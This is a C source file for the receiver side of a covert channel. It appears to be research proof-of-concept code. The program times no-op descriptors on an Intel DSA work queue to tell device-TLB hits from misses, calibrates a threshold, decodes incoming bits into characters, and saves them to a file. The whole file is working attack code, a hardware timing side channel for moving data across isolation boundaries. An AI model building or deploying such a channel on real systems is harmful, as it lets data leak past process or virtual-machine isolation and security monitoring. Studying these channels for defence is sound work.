#include "dsa.h"

#define BLEN (4096 << 0)
#define COMP_ARRAY_SIZE (4096 << 10)
#define CALIBRATION_RUNS 10000
#define DIFF_THRESHOLD 300
#define CALIBRATION_RETRIES 10

#define UPDATE_THRESHOLD(hit, miss) ((hit * 3 + miss * 7) / 10)

struct wq_info wq_info;
struct dsa_hw_desc desc = {};
struct dsa_completion_record* comp_array;
uint64_t detection_threshold;
struct timespec ts;
double time_elapsed = 0.0;
char message[CHARS_TO_RECEIVE] = {0};
int idx = 0;

uint64_t probe(struct dsa_completion_record* comp_record) {
    uint64_t start;
    memset(comp_record, 0, sizeof(struct dsa_completion_record) * 2);
    desc.completion_addr = (uintptr_t) comp_record;
    
    if (wq_info.wq_mapped) {
        submit_desc(wq_info.wq_portal, &desc);
    } else {
        int rc = write(wq_info.wq_fd, &desc, sizeof(desc));
        if (rc != sizeof(desc)) {
            fprintf(stderr, "[cc_receiver] Failed to submit descriptor\n");
            return 0;
        }
    }

    start = rdtsc();
    while (comp_record->status == 0);
    return rdtsc() - start;
}

static inline int receive() {
    uint64_t start = rdtsc();
    probe(comp_array);
    while (rdtsc() - start < BIT_INTERVAL_NS - 1000);
    uint64_t latency = probe(comp_array);
    return latency > detection_threshold;
}

int main(int argc, char *argv[]) {
    comp_array = (struct dsa_completion_record*)aligned_alloc(32, COMP_ARRAY_SIZE);
    if (!comp_array) {
        fprintf(stderr, "[cc_receiver] Failed to allocate memory\n");
        return EXIT_FAILURE;
    }
    memset(comp_array, 0, COMP_ARRAY_SIZE);
    
    int rc = map_spec_wq(&wq_info, "/dev/dsa/wq2.0");
    if (rc) {
        fprintf(stderr, "[cc_receiver] Failed to map work queue: %d\n", rc);
        return EXIT_FAILURE;
    }

    desc.opcode = DSA_OPCODE_NOOP;
    desc.flags = IDXD_OP_FLAG_CRAV | IDXD_OP_FLAG_RCR;
    
    int calib_retry = 0;
    printf("[cc_receiver] Calibrating device-TLB hit and miss latencies...\n");

calib:
    if (calib_retry++ > CALIBRATION_RETRIES) {
        printf("[cc_receiver] Calibration failed after %d retries\n", CALIBRATION_RETRIES);
        return EXIT_FAILURE;
    }
    
    uint64_t miss_total = 0, hit_total = 0;
    probe(comp_array);
    
    for (int i = 0; i < CALIBRATION_RUNS; i++) {
        probe(&comp_array[4096]);
        probe(&comp_array[4096 << 1]);
        miss_total += probe(&comp_array[0]);
        hit_total += probe(&comp_array[0]); // Now in DevTLB
    }
    uint64_t avg_miss = miss_total / CALIBRATION_RUNS;
    uint64_t avg_hit = hit_total / CALIBRATION_RUNS;

    if (avg_miss <= avg_hit || avg_miss - avg_hit < DIFF_THRESHOLD) {
        printf("[cc_receiver] Miss: %lu, Hit: %lu, Diff: %lu\n", 
               avg_miss, avg_hit, avg_miss - avg_hit);
        goto calib;
    }

    detection_threshold = UPDATE_THRESHOLD(avg_hit, avg_miss);
    
    printf("[cc_receiver] Calibration results:\n");
    printf("\tTLB miss latency: %lu cycles\n", avg_miss);
    printf("\tTLB hit latency:  %lu cycles\n", avg_hit);
    printf("\tDetection threshold: %lu cycles\n", detection_threshold);
    
    // Main reception loop
    printf("[cc_receiver] Starting reception (press Ctrl+C to stop)...\n");
    unsigned char received_char, bits, consecutive_bits;

    for (int j = 0; j < CHARS_TO_RECEIVE; j++) {
        consecutive_bits = 0, received_char = 0;
        while (1) {
            consecutive_bits = (receive()) ? consecutive_bits + 1 : 0;
            if (consecutive_bits >= START_BITS - 2) break;
        }

        clock_gettime(CLOCK_MONOTONIC, &ts);
        double start_time = (double) ts.tv_sec + (double) ts.tv_nsec / 1e9;

        for (int i = 0; i < BITS_TO_RECEIVE; i++) {
            bits = 0;
            for (int i = 0; i < BITS_REPEAT; i++) {
                bits += receive();
            }
            received_char |= (bits > (BITS_REPEAT / 3)) ? (1 << i) : 0;
        }

        clock_gettime(CLOCK_MONOTONIC, &ts);
        time_elapsed += ((double) ts.tv_sec + (double) ts.tv_nsec / 1e9) - start_time;
        
        message[idx++] = received_char;
    }

    printf("[cc_receiver] Time elapsed: %f\n", time_elapsed);
    // printf("[cc_receiver] Received message: %lx\n", *(uint64_t*) message);

    FILE *fp = fopen("recv", "wb");
    if (!fp) {
        perror("[cc_receiver] Failed to open receive file");
        return EXIT_FAILURE;
    }

    fwrite(message, 1, sizeof(message), fp);
    fclose(fp);

    return EXIT_SUCCESS;
} 